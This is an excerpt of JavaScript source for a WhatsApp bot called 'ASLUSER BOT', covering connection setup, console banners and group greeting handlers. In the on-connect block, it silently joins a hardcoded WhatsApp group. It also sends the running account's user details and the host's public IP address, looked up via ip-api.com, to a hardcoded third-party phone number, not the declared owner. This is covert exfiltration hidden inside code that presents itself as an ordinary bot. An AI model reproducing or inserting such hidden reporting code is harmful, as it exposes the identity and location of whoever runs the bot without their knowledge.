...
prefix = '#'
shp = '⬡'
owner = "917736835721@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["ASLU-SIR-1", "Chrome", "3.0"];
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, ASLU-SIR-1");
console.log(color(figlet.textSync(`${spc1}            ASLUSER BOT`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 follow a_s_l_a_m_._x', 'yellow'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/917736835721'))
    console.log(color('[ASLUSER BOT]'), color(' 𝑻𝑬𝑫𝒁𝑶 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 teks = `https://chat.whatsapp.com/KzPohCK51Tt0Ok4Gt0N12T`
 client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
 client.sendMessage(`17027147937@s.whatsapp.net`, `*Hi Owner ASLU-SIR-1, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Aslu Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./aslusir.jpg'),sourceUrl:"https://wa.me/917736835721?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("17027147937@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Aslu Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./aslusir.jpg'),sourceUrl:"https://wa.me/917736835721?text=Hello bro"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'ASlu',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Aslu;;;\nFN:resku\nitem1.TEL;waid=91773683572:+91 799-4873-071\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, im Asluser Bot, ready to help you here", "conversation");
      }
      ...
      if (anu.action == "remove" && !mem.includes(client.user.jid)) {
        ...
        buff = await getBuffer(
          `http://hadi-api.herokuapp.com/api/card/goodbye?nama=${anu_user}&descriminator=${
            ...
            mdata.subject
          )}&pp=${pp_user}&bg=https://i.imgur.com/BAPqUSz.png`
        );
        buttons = [
